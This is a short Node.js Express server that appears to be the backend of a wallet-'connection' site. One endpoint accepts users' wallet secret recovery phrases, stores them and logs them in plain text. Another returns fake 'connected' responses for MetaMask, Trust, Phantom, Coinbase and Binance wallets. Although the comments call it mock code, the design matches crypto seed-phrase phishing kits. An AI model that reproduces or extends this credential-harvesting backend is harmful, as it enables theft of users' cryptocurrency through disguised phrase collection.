const express = require('express');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3001;

// Middleware
app.use(cors()); // Enable CORS for React frontend
app.use(express.json()); // Parse JSON request bodies

// Mock wallet data for testing
const wallets = {};

// Manual connection endpoint
app.post('/api/send-wallet', (req, res) => {
  const { walletName, secretPhrase, userWalletName } = req.body;

  // Basic validation
  if (!walletName || !secretPhrase || !userWalletName) {
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  }

  // Mock processing (in a real app, validate and store securely)
  wallets[userWalletName] = { walletName, secretPhrase };
  console.log('Received wallet info:', { walletName, userWalletName, secretPhrase });

  res.json({ success: true, message: 'Wallet info processed successfully' });
});

// Automatic connection endpoint
app.post('/api/connect-:walletType', (req, res) => {
  const { walletType } = req.params;

  // Mock response (replace with actual wallet connection logic)
  if (['metamask', 'trust', 'phantom', 'coinbase', 'binance'].includes(walletType)) {
    res.json({
      success: true,
      address: `mock_address_${walletType}_${Date.now()}`,
      message: `Connected to ${walletType} successfully`
    });
  } else {
    res.status(400).json({ success: false, error: 'Unsupported wallet type' });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});